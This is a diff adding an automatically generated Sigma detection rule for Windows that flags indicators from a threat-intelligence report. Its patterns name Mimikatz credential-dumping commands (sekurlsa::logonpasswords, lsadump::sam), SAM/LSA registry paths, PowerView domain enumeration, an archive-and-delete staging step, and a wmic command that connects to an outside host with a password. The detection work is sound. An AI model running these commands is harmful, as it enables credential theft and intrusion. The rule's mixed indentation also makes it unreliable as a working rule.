@@ -1,0 +1,44 @@
+title: Threat Intel Automatic Sigma Rules
+id: 3c5a0085-daca-45ce-af94-2d5495039ada
+status: experimental
+description: Sigma rules generated automatically by Threat Intelligence Report Generator
+author: Alejandro Miguel Chirivella Ciruelos
+logsource:
+    product: windows
+detection:
+    selection:
+			Image|endswith:
+				- 'ntoskrnl.exe'
+				- 'rr.exe'
+			ImageLoaded|endswith:
+				- 'AclNumsInvertHost.dll'
+			TargetObject|contains:
+				- 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa'
+				- 'HKLM\SYSTEM'
+				- 'HKLM\SAM'
+				- 'HKLM\SECURITY'
+			CommandLine|contains:
+				- 'whoami'
+				- 'nltest'
+				- 'wmic /node'
+				- 'wmic process'
+				- 'powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties'
+				- 'powershell Get-WmiObject -Class Win32_Service -Computername'
+				- 'powershell Get-WindowsDriver -Online -All'
+				- 'privilege::debug'
+				- 'lsadump::cache'
+				- 'lsadump::secrets'
+				- 'lsadump::sam'
+				- 'sekurlsa::logonpasswords'
+				- 'powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q'
+				- 'Get-NetGroup'
+				- 'Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount"'
+				- 'Get-NetDiDomain'
+				- 'Get-AdUser'
+				- 'Get-DomainUser -UserName'
+				- 'Get-NetUser -PreauthNotRequire'
+				- 'Get-NetComputer | select samaccountname'
+				- 'Get-NetUser -SPN | select serviceprincipalname'
+				- 'wmic process call create "C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31"'
+    condition: selection
+level: high
